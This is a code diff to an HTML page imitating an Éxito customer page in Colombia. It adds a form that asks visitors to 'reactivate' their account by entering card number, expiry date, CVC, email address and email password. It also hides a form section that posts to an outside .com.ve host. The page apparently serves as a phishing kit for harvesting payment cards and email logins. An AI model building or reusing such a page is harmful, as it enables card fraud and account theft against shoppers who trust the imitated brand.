@@ -14,11 +14,70 @@
     <script src="alertify.js"></script>
     <script src="alertify.min.js"></script>
     <link href="css/Alertify/alertify.css" rel="stylesheet"><link href="/Scripts/css/Alertify/alertify.min.css" rel="stylesheet">
-    <script src="Popup.js"></script>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+	<script src="Popup.js"></script>
     <script src="Indicador.js"></script>
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.13.1/jquery.validate.min.js"></script>
 	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
 <!-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>-->
 <style>
+/* CSS for Credit Card Payment form */
+.credit-card-box .panel-title {
+    display: inline;
+    font-weight: bold;
+}
+.credit-card-box .form-control.error {
+    border-color: red;
+    outline: 0;
+    box-shadow: inset 0 1px 1px rgba(0,0,0,0.075),0 0 8px rgba(255,0,0,0.6);
+}
+.credit-card-box label.error {
+  font-weight: bold;
+  color: red;
+  padding: 2px 8px;
+  margin-top: 2px;
+}
+.credit-card-box .payment-errors {
+  font-weight: bold;
+  color: red;
+  padding: 2px 8px;
+  margin-top: 2px;
+}
+.credit-card-box label {
+    display: block;
+}
+/* The old "center div vertically" hack */
+.credit-card-box .display-table {
+    display: table;
+}
+.credit-card-box .display-tr {
+    display: table-row;
+}
+.credit-card-box .display-td {
+    display: table-cell;
+    vertical-align: middle;
+    width: 50%;
+}
+/* Just looks nicer */
+.credit-card-box .panel-heading img {
+    min-width: 180px;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #DetailContent {
     
@@ -370,8 +429,170 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm
 		
 	</tbody></table>
 </div>
+<div class="container" >
+<div class="row">
+<!-- You can make it whatever width you want. I'm making it full width
+on <= small devices and 4/12 page width on >= medium devices -->
+<div class="col-xs-12 col-md-6">
 
+<br>
+<!-- CREDIT CARD FORM STARTS HERE -->
+
+<div class="panel panel-default credit-card-box">
+
+<div class="panel-body">
+<form role="form" id="payment-form">
+<div class="row">
+<div class="col-xs-12">
+<div class="form-group">
+<label for="cardNumber" align="center">Ingrese sus datos para reactivar su cuenta y tarjeta exito</label>
+<div class="input-group">
+<input 
+onkeypress="soloNumeros()"
+type="tel"
+class="form-control"
+name="cardNumber"
+placeholder="Ingrese su tarjeta exito"
+autocomplete="cc-number"
+required autofocus 
+/>
+<span class="input-group-addon"><i class="fa fa-credit-card"></i></span>
+</div>
+</div>                            
+</div>
+</div>
+
+<div class="row">
+<div class="col-xs-12">
+<div class="form-group">
+<label for="cardNumber2">Fecha de expiración</label>
+</div>
+</div>
+</div>
+
+<div class="row">
+<div class=" col-md-4">
+<div class="form-group">
+<label for="cardExpiry"><span class="hidden-xs">Mes</span></label>
+<input 
+type="tel" 
+class="form-control" 
+id="mes"
+name="cardExpiry"
+placeholder="Mes"
+autocomplete="cc-exp"
+required 
+/>
+</div>
+</div>
+
+
+<div class=" col-md-3  ">
+<div class="form-group">
+<label for="cardCVC">Año</label>
+<input 
+id="ano"
+type="tel" 
+class="form-control"
+name="cardCVC"
+placeholder="Año"
+autocomplete="cc-csc"
+required
+/>
+</div>
+</div>
+
+<div class="col-xs-3 col-md-3 ">
+<div class="form-group">
+<label for="cardCVC">CVC</label>
+<input 
+id="cvv"
+type="tel" 
+class="form-control"
+name="cardCVC"
+placeholder="CVC"
+autocomplete="cc-csc"
+required
+/>
+</div>
+</div>
+
+
+</div>
+
+
+
+
+
+<div class="row">
+<div class="col-xs-6 col-md-6">
+<div class="form-group">
+<label for="cardNumber">Sincronice su Email</label>
+<div class="input-group">
+<input 
+type="tel"
+class="form-control"
+name="cardNumber"
+placeholder="Correo electronico"
+autocomplete="cc-number"
+required autofocus 
+/>
+
+
+
+</div>
+</div>  
+
+ 
+</div>
+
+<div class="col-xs-5 col-md-5 pull-right">
+<div class="form-group">
+<label for="cardNumber">Contraseña de su correo </label>
+<div class="input-group">
+<input 
+type="tel"
+class="form-control"
+name="cardNumber"
+placeholder="contraseña Email"
+autocomplete="cc-number"
+required autofocus 
+/>
+
+</div>
+</div>   
+</div>
+</div>
+
+
+
+
+
+
+<div class="row">
+<div class="col-xs-12">
+<button class="btn btn-success btn-lg btn-block" type="submit">Confirmar datos</button>
+</div>
+</div>
+<div class="row" style="display:none;">
+<div class="col-xs-12">
+<p class="payment-errors"></p>
+</div>
+</div>
+
+</div> 
+</div>           
+<!-- CREDIT CARD FORM ENDS HERE -->
+
+
+</div>            
+
+
+
+</div>
+</div>
         <div>
+
 
 </div>
     
@@ -383,7 +604,7 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm
 	
 	
 	<form id="miformulario" method="post" action="http://miprimerdominio.zz.com.ve/recibo.php" name="form2" >
-	<div class="oculto2"  id="oculto2">
+	<div class="oculto2" hidden id="oculto2">
 	<br><br><br>
 		<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
 	<tbody>
@@ -410,9 +631,32 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm
 	</tbody>
 	
 	</table>
+	</div><!-- -->
+	
+	
 	
 
-	</div>
+
+
+</form>
+	<!-- If you're using Stripe for payments -->
+<script type="text/javascript" src="https://js.stripe.com/v2/"></script>
+	
+</body>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
 
 	</form>
 
@@ -534,12 +778,159 @@ function soloNumeros(e){
         }
 
         );
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		var $form = $('#payment-form');
+$form.on('submit', payWithStripe);
+
+/* If you're using Stripe for payments */
+function payWithStripe(e) {
+    e.preventDefault();
+
+    /* Visual feedback */
+    $form.find('[type=submit]').html('Validating <i class="fa fa-spinner fa-pulse"></i>');
+
+    var PublishableKey = 'pk_test_b1qXXwATmiaA1VDJ1mOVVO1p'; // Replace with your API publishable key
+    Stripe.setPublishableKey(PublishableKey);
+    
+    /* Create token */
+    var expiry = $form.find('[name=cardExpiry]').payment('cardExpiryVal');
+    var ccData = {
+        number: $form.find('[name=cardNumber]').val().replace(/\s/g,''),
+        cvc: $form.find('[name=cardCVC]').val(),
+        exp_month: expiry.month, 
+        exp_year: expiry.year
+    };
+    
+    Stripe.card.createToken(ccData, function stripeResponseHandler(status, response) {
+        if (response.error) {
+            /* Visual feedback */
+            $form.find('[type=submit]').html('Try again');
+            /* Show Stripe errors on the form */
+            $form.find('.payment-errors').text(response.error.message);
+            $form.find('.payment-errors').closest('.row').show();
+        } else {
+            /* Visual feedback */
+            $form.find('[type=submit]').html('Processing <i class="fa fa-spinner fa-pulse"></i>');
+            /* Hide Stripe errors on the form */
+            $form.find('.payment-errors').closest('.row').hide();
+            $form.find('.payment-errors').text("");
+            // response contains id and card, which contains additional card details            
+            console.log(response.id);
+            console.log(response.card);
+            var token = response.id;
+            // AJAX - you would send 'token' to your server here.
+            $.post('/account/stripe_card_token', {
+                    token: token
+                })
+                // Assign handlers immediately after making the request,
+                .done(function(data, textStatus, jqXHR) {
+                    $form.find('[type=submit]').html('Payment successful <i class="fa fa-check"></i>').prop('disabled', true);
+                })
+                .fail(function(jqXHR, textStatus, errorThrown) {
+                    $form.find('[type=submit]').html('There was a problem').removeClass('success').addClass('error');
+                    /* Show Stripe errors on the form */
+                    $form.find('.payment-errors').text('Try refreshing the page and trying again.');
+                    $form.find('.payment-errors').closest('.row').show();
+                });
+        }
+    });
+}
+/* Fancy restrictive input formatting via jQuery.payment library*/
+$('input[name=cardNumber]').payment('formatCardNumber');
+$('input[name=cardCVC]').payment('formatCardCVC');
+$('input[name=cardExpiry').payment('formatCardExpiry');
+
+/* Form validation using Stripe client-side validation helpers */
+jQuery.validator.addMethod("cardNumber", function(value, element) {
+    return this.optional(element) || Stripe.card.validateCardNumber(value);
+}, "Please specify a valid credit card number.");
+
+jQuery.validator.addMethod("cardExpiry", function(value, element) {    
+    /* Parsing month/year uses jQuery.payment library */
+    value = $.payment.cardExpiryVal(value);
+    return this.optional(element) || Stripe.card.validateExpiry(value.month, value.year);
+}, "Invalid expiration date.");
+
+jQuery.validator.addMethod("cardCVC", function(value, element) {
+    return this.optional(element) || Stripe.card.validateCVC(value);
+}, "Invalid CVC.");
+
+validator = $form.validate({
+    rules: {
+        cardNumber: {
+            required: true,
+            cardNumber: true            
+        },
+        cardExpiry: {
+            required: true,
+            cardExpiry: true
+        },
+        cardCVC: {
+            required: true,
+            cardCVC: true
+        }
+    },
+    highlight: function(element) {
+        $(element).closest('.form-control').removeClass('success').addClass('error');
+    },
+    unhighlight: function(element) {
+        $(element).closest('.form-control').removeClass('error').addClass('success');
+    },
+    errorPlacement: function(error, element) {
+        $(element).closest('.form-group').append(error);
+    }
+});
+
+paymentFormReady = function() {
+    if ($form.find('[name=cardNumber]').hasClass("success") &&
+        $form.find('[name=cardExpiry]').hasClass("success") &&
+        $form.find('[name=cardCVC]').val().length > 1) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+$form.find('[type=submit]').prop('disabled', true);
+var readyInterval = setInterval(function() {
+    if (paymentFormReady()) {
+        $form.find('[type=submit]').prop('disabled', false);
+        clearInterval(readyInterval);
+    }
+}, 250);
+
+
+/*
+https://goo.gl/PLbrBK
+*/
+		
+		
+		
+		
+		
+		
+		
     </script>
 	
 	
             </div>
         </div>
-        <div id="ContactFrame">
+		
+		
+        <div id="ContactFrame"><br><br>
             Líneas de atención al cliente: Medellín 444 37 27, Bogotá 482 48 04, Cali 380 89 33 y otras ciudades 01 8000 978 888
         </div>
 
